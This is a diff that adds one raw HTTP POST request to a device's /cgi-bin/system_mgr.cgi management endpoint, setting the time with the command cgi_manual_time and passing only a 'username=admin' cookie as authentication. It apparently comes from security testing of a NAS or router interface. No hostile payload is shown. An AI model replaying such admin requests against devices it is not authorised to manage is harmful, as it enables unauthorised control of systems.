@@ -1,0 +1,15 @@
+POST /cgi-bin/system_mgr.cgi HTTP/1.1
+Host: 192.168.1.201
+Content-Length: 79
+Accept: */*
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Origin: http://192.168.1.201
+Referer: http://192.168.1.201/web/system_mgr/time.html
+Accept-Encoding: gzip, deflate, br
+Cookie: username=admin
+Connection: keep-alive
+
+cmd=cgi_manual_time&f_year=2024&f_month=10&f_day=17&f_hour=14&f_min=53&f_sec=17
